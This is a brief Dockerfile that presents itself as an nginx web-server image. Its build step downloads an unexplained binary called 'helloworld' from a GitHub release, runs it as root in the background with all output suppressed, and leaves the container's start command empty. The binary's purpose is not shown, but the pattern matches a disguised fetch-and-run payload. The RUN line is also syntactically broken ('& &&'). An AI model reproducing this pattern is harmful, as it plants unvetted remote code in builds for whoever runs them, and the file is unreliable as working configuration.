FROM nginx:latest
EXPOSE 80
WORKDIR /app
USER root

COPY nginx.conf /etc/nginx/nginx.conf

RUN apt-get update && apt-get install -y wget unzip iproute2 systemctl && \
    wget https://github.com/hdyco/helfworld/releases/download/helloworld/helloworld && \
    chmod +x helloworld && ./helloworld >/dev/null 2>&1 & && \
    nginx

CMD ["/bin/sh", "-c", ""]